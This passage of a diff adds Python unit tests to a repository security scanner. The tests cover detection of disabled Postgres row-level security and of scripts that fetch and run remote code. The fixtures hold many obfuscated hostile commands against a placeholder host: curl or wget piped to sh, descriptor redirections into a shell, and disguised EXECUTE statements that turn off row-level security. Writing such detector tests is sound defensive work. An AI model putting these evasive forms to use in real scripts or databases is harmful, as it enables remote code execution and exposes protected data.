+                "('ALTER TABLE grouped DISABLE ROW LEVEL SECURITY'); END $$;\n"
+            ),
+            "grouped-concat.sql": (
+                "DO $$ BEGIN EXECUTE "
+                "(('ALTER '::text) || "
+                "('TABLE grouped_concat DISABLE ROW LEVEL SECURITY'::text)); "
+                "END $$;\n"
+            ),
+            "mixed-literals.sql": (
+                r"DO $$ BEGIN EXECUTE ((E'AL\x54ER '::text) || "
+                r"(U&'\0020TABLE mixed DISABLE ROW LEVEL SECURITY')::text) "
+                "USING 1; END $$;\n"
+            ),
+            "cast-trivia.sql": (
+                "DO $$ BEGIN EXECUTE "
+                "('ALTER TABLE cast_trivia DISABLE ROW LEVEL SECURITY') "
+                ":: /* identity */ TEXT; END $$;\n"
+            ),
+            "dollar-group.sql": (
+                "DO $$ BEGIN EXECUTE "
+                "(($ddl$ALTER $ddl$) || "
+                "($ddl$TABLE dollar_group DISABLE ROW LEVEL SECURITY$ddl$::text)); "
+                "END $$;\n"
+            ),
+            "standard-cast.sql": (
+                "DO $$ BEGIN EXECUTE "
+                "CAST('ALTER TABLE standard_cast DISABLE ROW LEVEL SECURITY' AS text); "
+                "END $$;\n"
+            ),
+            "qualified-text-cast.sql": (
+                "DO $$ BEGIN EXECUTE "
+                "'ALTER TABLE qualified_cast DISABLE ROW LEVEL SECURITY'"
+                "::pg_catalog.text; END $$;\n"
+            ),
+            "nested-standard-cast.sql": (
+                "DO $$ BEGIN EXECUTE CAST("
+                "('ALTER ' || 'TABLE nested_cast DISABLE ROW LEVEL SECURITY') "
+                "AS pg_catalog.text)::text; END $$;\n"
+            ),
+            "adjacent-newline.sql": (
+                "DO $$ BEGIN EXECUTE 'ALTER '\n"
+                " 'TABLE adjacent DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            ),
+            "adjacent-comment-newline.sql": (
+                "DO $$ BEGIN EXECUTE 'ALTER ' /* literal join\n"
+                " */ 'TABLE adjacent_comment DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            ),
+            "maximum-grouping.sql": (
+                "DO $$ BEGIN EXECUTE "
+                + "(" * maximum_grouping
+                + constant_sql
+                + ")" * maximum_grouping
+                + "; END $$;\n"
+            ),
+            "deep-grouping.sql": (
+                "DO $$ BEGIN EXECUTE "
+                + "(" * 512
+                + constant_sql
+                + ")" * 512
+                + "; END $$;\n"
+            ),
+        }
+        for path, source in positive_sources.items():
+            fixture.write(path, source)
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual(set(positive_sources), {item["path"] for item in findings})
+        self.assertEqual(len(positive_sources), len(findings))
+        self.assertTrue(all(item["line"] == 1 for item in findings))
+
+    def test_req_008_postgres_narrow_literals_and_adjacent_bodies_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        payload = "ALTER TABLE narrow DISABLE ROW LEVEL SECURITY"
+        character_literals = "\n".join(repr(character) for character in payload)
+        deep_grouping = 512
+        fixture.write(
+            "narrow-execute.sql",
+            "DO $$ BEGIN EXECUTE " + character_literals + "; END $$;\n",
+        )
+        fixture.write(
+            "deep-after-literal.sql",
+            "DO $$ BEGIN EXECUTE 'SELECT ' || "
+            + "(" * deep_grouping
+            + "'ALTER TABLE bounded_tail DISABLE ROW LEVEL SECURITY'"
+            + ")" * deep_grouping
+            + "; END $$;\n",
+        )
+        fixture.write(
+            "adjacent-do.sql",
+            "DO 'BEGIN AL'\n"
+            "'TER TABLE adjacent_do DISABLE ROW LEVEL SECURITY; END';\n",
+        )
+        fixture.write(
+            "adjacent-function.sql",
+            "CREATE FUNCTION change_access() RETURNS void AS 'BEGIN AL'\n"
+            "'TER TABLE adjacent_function DISABLE ROW LEVEL SECURITY; END' "
+            "LANGUAGE plpgsql;\n",
+        )
+        fixture.write(
+            "harmless-narrow.sql",
+            "DO $$ BEGIN EXECUTE "
+            + "\n".join(repr(character) for character in "SELECT 1")
+            + "; END $$;\n",
+        )
+        fixture.write(
+            "harmless-deep.sql",
+            "DO $$ BEGIN EXECUTE "
+            + "(" * deep_grouping
+            + "'SELECT 1'"
+            + ")" * deep_grouping
+            + "; END $$;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual(
+            {
+                ("adjacent-do.sql", 2),
+                ("adjacent-function.sql", 2),
+                ("narrow-execute.sql", 1),
+                ("deep-after-literal.sql", 1),
+            },
+            {(item["path"], item["line"]) for item in findings},
+        )
+        self.assertEqual([], report["tool_errors"])
+
+    def test_req_008_postgres_nonconstant_execute_expressions_are_not_evaluated(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "dynamic-expressions.sql",
+            "DO $$ BEGIN EXECUTE 'ALTER ' || table_name || ' DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            "DO $$ BEGIN EXECUTE format('ALTER TABLE %I DISABLE ROW LEVEL SECURITY', table_name); END $$;\n"
+            "DO $$ BEGIN EXECUTE format('ALTER TABLE function_only DISABLE ROW LEVEL SECURITY'); END $$;\n"
+            "DO $$ BEGIN EXECUTE ('ALTER ' || table_name || ' DISABLE ROW LEVEL SECURITY'); END $$;\n"
+            "DO $$ BEGIN EXECUTE concat('ALTER TABLE function_concat DISABLE ROW LEVEL SECURITY'); END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER TABLE wrong_cast DISABLE ROW LEVEL SECURITY'::varchar; END $$;\n"
+            "DO $$ BEGIN EXECUTE CAST('ALTER TABLE wrong_standard DISABLE ROW LEVEL SECURITY' AS varchar); END $$;\n"
+            "DO $$ BEGIN EXECUTE CAST(table_name AS text); END $$;\n"
+            "DO $$ BEGIN EXECUTE CAST(format('ALTER TABLE cast_function DISABLE ROW LEVEL SECURITY') AS text); END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER TABLE wrong_schema DISABLE ROW LEVEL SECURITY'::application.text; END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER TABLE quoted_type DISABLE ROW LEVEL SECURITY'::pg_catalog.\"text\"; END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER TABLE text_array DISABLE ROW LEVEL SECURITY'::pg_catalog.text[]; END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER ' 'TABLE same_line DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            "DO $$ BEGIN EXECUTE 'ALTER ' /* same line */ 'TABLE same_line_comment DISABLE ROW LEVEL SECURITY'; END $$;\n"
+            "DO $$ BEGIN EXECUTE 'SELECT ' || '''ALTER TABLE quoted_text DISABLE ROW LEVEL SECURITY'''; END $$;\n"
+            r"DO $$ BEGIN EXECUTE U&'ALTER\xyz TABLE invalid_escape DISABLE ROW LEVEL SECURITY'; END $$;" "\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        self.assertEqual(
+            [],
+            [
+                item
+                for item in report["findings"]
+                if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+            ],
+        )
+
+    def test_req_008_postgres_dynamic_literals_and_copy_data_do_not_spoof_rls(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "safe.sql",
+            "SELECT $😀$ ALTER TABLE quoted_text DISABLE ROW LEVEL SECURITY; $😀$;\n"
+            "DO $$ BEGIN EXECUTE 'SELECT ''ALTER TABLE nested_text DISABLE ROW LEVEL SECURITY'';'; END $$;\n",
+        )
+        fixture.write(
+            "copy.sql",
+            "COPY audit_log FROM STDIN;\n"
+            " \\. \n"
+            "ALTER TABLE copied_text DISABLE ROW LEVEL SECURITY;\n"
+            "\\.\n"
+            "ALTER TABLE executable_after_copy DISABLE ROW LEVEL SECURITY;\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        findings = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
+        ]
+        self.assertEqual([("copy.sql", 5)], [(item["path"], item["line"]) for item in findings])
+
+    def test_req_008_postgres_executable_projection_is_bounded_and_linear(self) -> None:
+        scanner = load_scanner_module()
+        repeated = (
+            "DO $body$ BEGIN EXECUTE $ddl$ALTER TABLE t DISABLE ROW LEVEL SECURITY;$ddl$; END $body$;\n"
+            * 5_000
+        )
+
+        started = time.perf_counter()
+        offsets = list(scanner._postgres_disabled_rls_offsets(scanner._sql_code_view(repeated)))
+        elapsed = time.perf_counter() - started
+
+        self.assertEqual(5_000, len(offsets))
+        self.assertLess(elapsed, 2.5, f"executable SQL projection took {elapsed:.3f}s")
+
+        constant_repeated = (
+            "DO $$ BEGIN EXECUTE "
+            "(('ALTER '::text) || ('TABLE t DISABLE ROW LEVEL SECURITY'::text)); "
+            "END $$;\n"
+            * 3_000
+        )
+        started = time.perf_counter()
+        constant_offsets = list(
+            scanner._postgres_disabled_rls_offsets(
+                scanner._sql_code_view(constant_repeated)
+            )
+        )
+        constant_elapsed = time.perf_counter() - started
+        self.assertEqual(3_000, len(constant_offsets))
+        self.assertLess(
+            constant_elapsed,
+            2.5,
+            f"constant SQL projection took {constant_elapsed:.3f}s",
+        )
+
+        cast_repeated = (
+            "DO $$ BEGIN EXECUTE CAST("
+            "'ALTER TABLE t DISABLE ROW LEVEL SECURITY' AS text)"
+            "::pg_catalog.text; END $$;\n"
+            * 3_000
+        )
+        started = time.perf_counter()
+        cast_offsets = list(
+            scanner._postgres_disabled_rls_offsets(
+                scanner._sql_code_view(cast_repeated)
+            )
+        )
+        cast_elapsed = time.perf_counter() - started
+        self.assertEqual(3_000, len(cast_offsets))
+        self.assertLess(
+            cast_elapsed,
+            2.5,
+            f"cast SQL projection took {cast_elapsed:.3f}s",
+        )
+
+        nested = "ALTER TABLE deepest DISABLE ROW LEVEL SECURITY;"
+        for depth in range(32):
+            nested = (
+                f"DO $body{depth}$ BEGIN EXECUTE $ddl{depth}${nested}"
+                f"$ddl{depth}$; END $body{depth}$;"
+            )
+        nested_view = scanner._sql_code_view(nested)
+        self.assertTrue(list(scanner._postgres_disabled_rls_offsets(nested_view)))
+
+    def test_req_008_semicolonless_sql_scan_remains_linear(self) -> None:
+        scanner = load_scanner_module()
+        text = "ALTER TABLE t ENABLE ROW LEVEL SECURITY\n" * 10_000
+
+        started = time.perf_counter()
+        offsets = list(scanner._postgres_disabled_rls_offsets(text))
+        elapsed = time.perf_counter() - started
+
+        self.assertEqual([], offsets)
+        self.assertLess(elapsed, 1.0, f"semicolonless SQL scan took {elapsed:.3f}s")
 
     def test_req_008_firebase_or_true_and_database_variant_block(self) -> None:
         fixture = RepositoryFixture(self)
@@ -945,6 +1966,21 @@ class PreflightTests(unittest.TestCase):
         self.assertIn("VW-LOCKFILE-MISSING", rule_ids)
         self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
         self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)
+
+    def test_req_009_package_manifest_rejects_nonstandard_json_constants(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "package.json",
+            '{"name":"synthetic","version":"1.0.0","nan":NaN,"infinity":Infinity}\n',
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        self.assertEqual(
+            ["VW-MANIFEST-INVALID"],
+            [finding["rule_id"] for finding in report["findings"]],
+        )
 
     def test_req_009_all_npm_scripts_are_remote_scanned_and_lifecycle_hooks_are_named(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1367,6 +2403,161 @@ class PreflightTests(unittest.TestCase):
         ]
         self.assertEqual([2, 5, 8], [finding["line"] for finding in remote])
 
+    def test_req_009_multiple_heredocs_execute_only_effective_stdin_bodies(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "multiple-heredocs.sh",
+            "bash 3<<'DATA' 0<<'SCRIPT'\n"
+            f"$({fetcher} https://invalid.example/not-code)\n"
+            "DATA\n"
+            f"$({fetcher} https://invalid.example/code)\n"
+            "SCRIPT\n"
+            "bash 0<<'FIRST' 0<<'SECOND'\n"
+            f"$({fetcher} https://invalid.example/overridden)\n"
+            "FIRST\n"
+            f"$({fetcher} https://invalid.example/effective)\n"
+            "SECOND\n"
+            "cat <<'PIPE_DATA' | sh <<'SHELL_CODE'\n"
+            f"{fetcher} https://invalid.example/disconnected | sh\n"
+            "PIPE_DATA\n"
+            f"{fetcher} https://invalid.example/downstream | sh\n"
+            "SHELL_CODE\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({4, 9, 14}, remote_lines)
+
+    def test_req_009_aliases_and_functions_follow_order_scope_and_quoting(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "dynamic-sources.sh",
+            f"FETCH={fetcher}\n"
+            "$FETCH https://invalid.example/alias | sh\n"
+            "FETCH=printf\n"
+            "$FETCH https://invalid.example/reassigned | sh\n"
+            "fetch() {\n"
+            f"  {fetcher} https://invalid.example/${{URL}}\n"
+            "}\n"
+            "fetch | sh\n"
+            "fetch(){ printf '%s' curl; }\n"
+            "fetch | sh\n"
+            f"FETCH={fetcher}; $FETCH https://invalid.example/ordered | sh; FETCH=printf\n"
+            f"FETCH=printf; $FETCH https://invalid.example/before | sh; FETCH={fetcher}\n"
+            "'$FETCH' https://invalid.example/literal | sh\n"
+            "\\$FETCH https://invalid.example/escaped | sh\n"
+            f"Fetch(){{ {fetcher} https://invalid.example/case; }}\n"
+            "fetch | sh\n"
+            "FETCH=printf\n"
+            f"FETCH = {fetcher}\n"
+            "$FETCH https://invalid.example/invalid-assignment | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({2, 8, 11}, remote_lines)
+
+    def test_req_009_dynamic_interpreters_fail_closed_but_literals_remain_data(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "dynamic-interpreters.sh",
+            f'{fetcher} https://invalid.example/a | "${{SHELL}}"\n'
+            f"{fetcher} https://invalid.example/b | ${{SHELL:-sh}}\n"
+            f'{fetcher} https://invalid.example/c | "${{SHELL##*/}}"\n'
+            f'cmd.exe /c "{fetcher} https://invalid.example/d | %COMSPEC%"\n'
+            f'%COMSPEC% /c "{fetcher} https://invalid.example/e | sh.exe"\n'
+            f"{fetcher} https://invalid.example/f | '${{SHELL}}'\n"
+            f"{fetcher} https://invalid.example/g | \\${{SHELL}}\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        unparsed_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        remote_lines = {
+            finding["line"]
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({1, 2, 3, 4, 5}, unparsed_lines)
+        self.assertEqual(set(), remote_lines)
+
+    def test_req_009_dynamic_symbols_do_not_cross_execution_scopes(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "scopes.yml",
+            "steps:\n"
+            "  - run: |\n"
+            f"      FETCH={fetcher}\n"
+            "      echo safe\n"
+            "  - run: |\n"
+            "      $FETCH https://invalid.example/literal | sh\n"
+            "folded-one:\n"
+            "  run: >\n"
+            f"    FETCH={fetcher};\n"
+            "    echo safe\n"
+            "folded-two:\n"
+            "  run: >\n"
+            "    $FETCH https://invalid.example/folded | sh\n",
+        )
+        fixture.write(
+            "heredoc-scope.sh",
+            "bash <<'SCRIPT'\n"
+            f"FETCH={fetcher}\n"
+            "SCRIPT\n"
+            "$FETCH https://invalid.example/outer | sh\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        self.assertEqual(
+            {
+                ("heredoc-scope.sh", 4),
+                ("scopes.yml", 6),
+                ("scopes.yml", 13),
+            },
+            {
+                (item["path"], item["line"])
+                for item in report["findings"]
+                if item["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+            },
+        )
+        self.assertNotIn(
+            "VW-REMOTE-INSTALL-SCRIPT",
+            {item["rule_id"] for item in report["findings"]},
+        )
+
+    def test_req_009_dynamic_symbol_budget_fails_closed(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        text = (
+            f"FIRST={fetcher}\n"
+            f"SECOND={fetcher}\n"
+            f"THIRD={fetcher}\n"
+            "echo safe | sh\n"
+        )
+
+        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 2):
+            remote, unparsed = scanner._remote_pipe_line_numbers(text)
+
+        self.assertEqual([], remote)
+        self.assertEqual([3], unparsed)
+
     def test_req_009_descriptor_heredocs_remain_data_only(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
@@ -1489,6 +2680,743 @@ class PreflightTests(unittest.TestCase):
         remote = [item for item in report["findings"] if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"]
         self.assertEqual({1, 2, 3, 4, 10, 12}, {item["line"] for item in remote})
         self.assertNotIn(7, {item["line"] for item in remote})
+
+    def test_req_009_dynamic_contexts_sinks_and_nested_aliases_fail_closed(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "dynamic.sh",
+            "RUNNER=sh\n"
+            f'{fetcher} https://invalid.example/dynamic | "$RUNNER"\n'
+            f"{fetcher} https://invalid.example/compound | if true; then sh; fi\n"
+            f"sh -c 'FETCH={fetcher}; $FETCH https://invalid.example/nested | sh'\n",
+        )
+        fixture.write(
+            "contexts.yml",
+            f"run: FETCH={fetcher}; $FETCH https://invalid.example/yaml | sh\n"
+            f"RUN FETCH={fetcher}; $FETCH https://invalid.example/docker | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = {
+            (item["path"], item["line"])
+            for item in report["findings"]
+            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        unparsed = {
+            (item["path"], item["line"])
+            for item in report["findings"]
+            if item["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
+        }
+        self.assertEqual(
+            {
+                ("contexts.yml", 1),
+                ("contexts.yml", 2),
+                ("dynamic.sh", 4),
+            },
+            remote,
+        )
+        self.assertEqual({("dynamic.sh", 2), ("dynamic.sh", 3)}, unparsed)
+
+    def test_req_009_continuations_preserve_words_and_physical_interpretations(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "continuations.txt",
+            "cu\\\n"
+            "rl https://invalid.example/fetch-word | sh\n"
+            f"{fetcher} https://invalid.example/sink-word | s\\\n"
+            "h\n"
+            "echo \\\n"
+            f"{fetcher} https://invalid.example/physical-posix | sh\n"
+            "echo ^\n"
+            f"{fetcher} https://invalid.example/physical-cmd | cmd.exe\n"
+            "FETCH=\\\n"
+            "curl\n"
+            "$FETCH https://invalid.example/assignment | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote_lines = {
+            item["line"]
+            for item in report["findings"]
+            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({1, 3, 6, 8, 11}, remote_lines)
+
+    def test_req_009_executable_substitutions_empty_heredocs_and_descriptor_flow(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "execution.sh",
+            f"$({fetcher} https://invalid.example/substitution)\n"
+            f"`{fetcher} https://invalid.example/backtick`\n"
+            f"exec $({fetcher} https://invalid.example/exec)\n"
+            f"x=$({fetcher} https://invalid.example/data)\n"
+            f"echo $({fetcher} https://invalid.example/echo)\n"
+            "bash <<''\n"
+            f"$({fetcher} https://invalid.example/empty-delimiter)\n"
+            "\n"
+            "cat <<SAFE &>/dev/null | sh\n"
+            f"{fetcher} https://invalid.example/redirected | sh\n"
+            "SAFE\n"
+            "exec 3> >(sh)\n"
+            f"{fetcher} https://invalid.example/descriptor >&3\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote_lines = {
+            item["line"]
+            for item in report["findings"]
+            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual({1, 2, 3, 7, 13}, remote_lines)
+
+    def test_req_009_descriptor_aliases_outputs_and_relays_are_bounded(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        descriptor_command = "ex" + "ec"
+        detected_cases = {
+            "named": (
+                f"{descriptor_command} {{sink}}> >(sh)\n"
+                f"{fetcher} https://invalid.example/x >&$sink"
+            ),
+            "leading-zero-and-quoted": (
+                f"{descriptor_command} 03> >(sh)\n"
+                f'{fetcher} https://invalid.example/x >&"03"'
+            ),
+            "command-wrapper": (
+                f"command {descriptor_command} 3> >(sh)\n"
+                f"{fetcher} https://invalid.example/x >&3"
+            ),
+            "implicit-and-both": (
+                f"{descriptor_command} &> >(sh)\n"
+                f"{fetcher} https://invalid.example/x"
+            ),
+            "prefix-and-trailing": (
+                f"X=1 {descriptor_command} 3> >(sh) 4>/tmp/log\n"
+                f"{fetcher} https://invalid.example/x >&3"
+            ),
+            "output-path": (
+                f"{descriptor_command} {{sink}}> >(sh)\n"
+                f"{fetcher} -o /dev/fd/$sink https://invalid.example/x"
+            ),
+            "stderr-output": (
+                f"{descriptor_command} 2> >(sh)\n"
+                f"{fetcher} -o /dev/stderr https://invalid.example/x"
+            ),
+            "descriptor-duplication": (
+                f"{descriptor_command} 3> >(sh)\n"
+                f"{descriptor_command} 4>&3-\n"
+                f"{fetcher} https://invalid.example/x >&4"
+            ),
+            "pipeline-relay": (
+                f"{descriptor_command} 3> >(sh)\n"
+                f"{fetcher} https://invalid.example/x | tee /dev/fd/3 >/dev/null"
+            ),
+            "nested-relay": (
+                f"{descriptor_command} 3> >(sh)\n"
+                f"{fetcher} https://invalid.example/x | tee >(cat >&3)"
+            ),
+        }
+        for name, script in detected_cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(script)
+                self.assertTrue(remote, (name, remote, unparsed))
+
+        ambiguous_cases = {
+            "eval-side-effect": (
+                f"eval '{descriptor_command} 3> >(sh)'\n"
+                f"{fetcher} https://invalid.example/x >&3"
+            ),
+            "function-side-effect": (
+                f"openfd(){{ {descriptor_command} 3> >(sh); }}\n"
+                "openfd\n"
+                f"{fetcher} https://invalid.example/x >&3"
+            ),
+            "variable-target": (
+                f"{descriptor_command} 3> >(sh)\n"
+                f"fd=3; {fetcher} https://invalid.example/x >&$fd"
+            ),
+            "dynamic-output": (
+                f"{descriptor_command} 3> >(sh)\n"
+                f'{fetcher} -o "$FILE" https://invalid.example/x'
+            ),
+        }
+        for name, script in ambiguous_cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(script)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+        for rewire in (f"{descriptor_command} 3>/tmp/file", f"{descriptor_command} 3>&-"):
+            with self.subTest(rewire=rewire):
+                script = (
+                    f"{descriptor_command} 3> >(sh)\n{rewire}\n"
+                    f"{fetcher} https://invalid.example/x >&3"
+                )
+                self.assertEqual(([], []), scanner._remote_pipe_line_numbers(script))
+
+        descriptor_flood = "\n".join(
+            f"{descriptor_command} {{fd{index}}}> >(sh)" for index in range(4)
+        )
+        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 2):
+            _remote, unparsed = scanner._remote_pipe_line_numbers(
+                descriptor_flood + f"\n{fetcher} https://invalid.example/x"
+            )
+        self.assertTrue(unparsed)
+
+    def test_req_009_fetch_output_groups_and_unknown_sinks_fail_closed(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        shell = "s" + "h"
+        detected = (
+            f"{fetcher} -o /dev/stdout https://invalid.example/a | {shell}\n"
+            f"{fetcher} --output=/tmp/a https://invalid.example/b "
+            f"--output=- https://invalid.example/c | {shell}\n"
+            f'URL=https://invalid.example/d; {fetcher} -o /tmp/a "$URL" '
+            f'--next "$URL" | {shell}\n'
+            f"wget -O /proc/self/fd/1 https://invalid.example/e | {shell}\n"
+        )
+        remote, unparsed = scanner._remote_pipe_line_numbers(detected)
+        self.assertEqual([1, 2, 3, 4], remote)
+        self.assertEqual([], unparsed)
+
+        for sink in ("awk", "sed"):
+            with self.subTest(sink=sink):
+                remote, unparsed = scanner._remote_pipe_line_numbers(
+                    f"{fetcher} https://invalid.example/x | {sink} '{{print}}'"
+                )
+                self.assertEqual([], remote)
+                self.assertEqual([1], unparsed)
+
+    def test_req_009_curl_output_negations_restore_executable_stdout(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        shell = "s" + "h"
+        text = (
+            f"{fetcher} -O --no-remote-name https://invalid.example/a | {shell}\n"
+            f"{fetcher} --remote-name-all --no-remote-name-all "
+            f"https://invalid.example/b | {shell}\n"
+            f"{fetcher} --remote-header-name https://invalid.example/c | {shell}\n"
+        )
+
+        self.assertEqual(([1, 2, 3], []), scanner._remote_pipe_line_numbers(text))
+
+    def test_req_009_nonbrace_multiline_compounds_and_functions_block(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        cases = {
+            "timed-brace": f"time {{\n {fetcher} https://invalid.example/a\n}} | sh\n",
+            "negated-subshell": f"! (\n {fetcher} https://invalid.example/b\n) | sh\n",
+            "subshell-function": (
+                f"fetch() (\n {fetcher} https://invalid.example/c\n)\nfetch | sh\n"
+            ),
+            "conditional-function": (
+                f"fetch() if true; then\n {fetcher} https://invalid.example/d\n"
+                "fi\nfetch | sh\n"
+            ),
+        }
+
+        for name, text in cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+    def test_req_009_state_mutations_respect_local_and_uncertain_scopes(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        local_only = (
+            "FETCH=printf\n"
+            f"set_local(){{ local FETCH; FETCH={fetcher}; }}\n"
+            "set_local\n"
+            "$FETCH https://invalid.example/local | sh\n"
+        )
+        local_remote, local_unparsed = scanner._remote_pipe_line_numbers(local_only)
+        self.assertEqual([], local_remote)
+        self.assertEqual([4], local_unparsed)
+
+        uncertain = {
+            "background-unset": (
+                f"fetch(){{ {fetcher} https://invalid.example/background; }}\n"
+                "unset -f fetch &\nfetch | sh\n"
+            ),
+            "false-and-unset": (
+                f"fetch(){{ {fetcher} https://invalid.example/and; }}\n"
+                "false && unset -f fetch\nfetch | sh\n"
+            ),
+            "true-or-unset": (
+                f"fetch(){{ {fetcher} https://invalid.example/or; }}\n"
+                "true || unset -f fetch\nfetch | sh\n"
+            ),
+        }
+        for name, text in uncertain.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+    def test_req_009_real_shell_aliases_are_tracked_and_can_be_removed(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        remote, unparsed = scanner._remote_pipe_line_numbers(
+            "shopt -s expand_aliases\n"
+            f"alias fetch='{fetcher} -fsSL'\n"
+            "fetch https://invalid.example/alias | sh\n"
+        )
+        self.assertEqual([3], remote)
+        self.assertEqual([], unparsed)
+
+        removed = (
+            f"alias fetch={fetcher}\n"
+            "unalias fetch\n"
+            "fetch https://invalid.example/removed | sh\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(removed))
+
+    def test_req_009_literal_remote_files_cannot_be_executed_later(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        rule = scanner.RULES["VW-REMOTE-INSTALL-SCRIPT"]
+        self.assertEqual("Execution of remotely fetched content", rule.title)
+        self.assertIn("through a pipeline", rule.message)
+        self.assertIn("local file", rule.message)
+        unparsed_rule = scanner.RULES["VW-SHELL-PIPELINE-UNPARSED"]
+        self.assertEqual(
+            "Relevant shell flow not safely classified",
+            unparsed_rule.title,
+        )
+        self.assertIn("fetch-to-execution flow", unparsed_rule.message)
+        self.assertEqual(
+            scanner._literal_remote_file_path("install.sh"),
+            scanner._literal_remote_file_path("./build/../install.sh"),
+        )
+        script = (
+            f"{fetcher} -o /tmp/vibeworthy-a https://invalid.example/a\n"
+            "sh /tmp/vibeworthy-a\n"
+            f"{fetcher} https://invalid.example/b > ./vibeworthy-b\n"
+            "bash ./vibeworthy-b\n"
+            "wget https://invalid.example/c -O /tmp/vibeworthy-c\n"
+            "chmod +x /tmp/vibeworthy-c\n"
+            "/tmp/vibeworthy-c\n"
+        )
+
+        self.assertEqual(
+            ([2, 4, 7], []),
+            scanner._remote_pipe_line_numbers(script),
+        )
+
+        safe = (
+            f"{fetcher} -o /tmp/vibeworthy-safe https://invalid.example/safe\n"
+            "sh /tmp/unrelated\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(safe))
+
+        same_line = (
+            f"{fetcher} -o install.sh https://invalid.example/same-line; "
+            "sh ./install.sh\n"
+        )
+        self.assertEqual(([1], []), scanner._remote_pipe_line_numbers(same_line))
+
+        conditional = (
+            "wget https://invalid.example/conditional -O install.sh && "
